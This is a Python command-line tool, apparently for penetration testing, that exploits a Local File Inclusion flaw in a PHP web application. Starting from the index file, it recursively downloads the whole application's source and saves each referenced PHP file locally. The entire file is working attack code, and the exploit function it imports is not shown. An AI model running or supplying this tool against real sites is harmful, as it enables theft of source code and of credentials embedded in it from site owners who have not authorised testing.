from lfi import get_source_LFI
import argparse
import requests
from urllib.parse import urlsplit
import os.path
import re
from pathlib import Path

# return only schema + host
def format_base_url(url):
    split_url = urlsplit(url)
    return f'{split_url.scheme}://{split_url.netloc}'

# make sure it is a full path starting and ending with /
def format_www(w):
    if not w.startswith('/'):
        w = '/' + w

    if not w.endswith('/'):
        w = w + '/'

    return w

# path should end with /
def format_output(o):
    
    if not o.endswith('/'):
        o = o + '/'

    return o

# make sure we get a 200
def basic_alive_test(url):
    print(f'Testing the site: {url}')
    try:
        r = requests.get(url);
        return r.status_code == 200
    except:
        return False

parser = argparse.ArgumentParser(
                    prog='LFI PHP App Dumper',
                    description='This will extract all the source code of a PHP app if you have found an LFI (Local File Inclusion)',
                    epilog='Usage example: python dumper.py http://testphp.vulnweb.com')
parser.add_argument('base', metavar='Base_URL', help='Example: http://testphp.vulnweb.com')
parser.add_argument('-indexFile', dest='indexFile', help='This is the index PHP file / starting point PHP file. Defaults to \'index.php\'', default='index.php')
parser.add_argument('-www', dest='www', help='This is the absolute directory on the server that is serving the PHP app. Defaults to \'/var/www/\'', default='/var/www/')
parser.add_argument('-output', dest='output', help='This is the directory in which the PHP source code files will be saved in. Defualts to \'output\'', default='output')
args = parser.parse_args()

output = args.output
base = args.base
www = args.www
indexFile = args.indexFile

base = format_base_url(base)
www = format_www(www)
output = format_output(output)

if not basic_alive_test(f'{base}/{indexFile}'):
    print('Some error accessing the website ... exiting ...')
    exit()

def write_file(data, full_file_path):
    f = open(full_file_path, "w")
    f.write(data)
    f.close()

def clean_php_ref(f):
    for special in ('"', '=', ' ', '\''):
        f = f.split(special)[-1]
    if f.startswith('/'):
        f = f[1:]
    return f

def extract_remote_php_files(html_content):
    result = set()
    php_pattern = re.compile(r'\b\S+\.php\b', re.IGNORECASE)
    php_files = php_pattern.findall(html_content)
    for file in list(php_files):
        clean_file = clean_php_ref(file)
        if not clean_file == '.php':
            result.add(clean_file)
    return list(result)

def get_directory_from_file_path(full_path):
    split = full_path.split('/')
    return '/'.join(split[:-1])+'/'

def remove_end_slash(p):
    if p.endswith('/'):
        p = p[:-1]
    return p

def remove_start_slash(p):
    if p.startswith('/'):
        p = p[1:]
    return p

def remove_start_end_slash(p):
    p = remove_start_slash(p)
    p = remove_end_slash(p)
    return p

def resolve_to_min_directory(path):
    # Resolve the absolute path based on the base directory
    absolute_path = Path(path).resolve()

    # Make sure the resolved path is within the base directory
    if not str(absolute_path).startswith(os.path.abspath(output)):
        return output
    
    return path

def process(current_remote_dir, rel_file_path):

    current_remote_dir = remove_start_end_slash(current_remote_dir)
    rel_file_path = remove_start_slash(rel_file_path)

    slash = ''
    if len(current_remote_dir.strip()) != 0:
        slash = '/'
    
    downloadable_ref = f'{www}{current_remote_dir}{slash}{rel_file_path}'
    local_save_ref = resolve_to_min_directory(f'{output}{current_remote_dir}{slash}{rel_file_path}')
    
    if os.path.isfile(local_save_ref):
        # print(f'Skipping {rel_file_path} [already downloaded]')
        return
    
    dir = resolve_to_min_directory(get_directory_from_file_path(local_save_ref))
    if not os.path.exists(dir):
        os.makedirs(dir)

    (file_found, data) = get_source_LFI(base, f'{downloadable_ref}')
    if not file_found:
        return;
    print(f'Downloaded {downloadable_ref}')
    write_file(data, local_save_ref)

    extracted_list = extract_remote_php_files(data)
    for file in extracted_list:
        target_file = file.strip().split('/')[-1]
        target_dir = remove_end_slash(get_directory_from_file_path(file))
        process(target_dir, target_file)

process('', indexFile)
print('\n\n*** Done ***\n\n')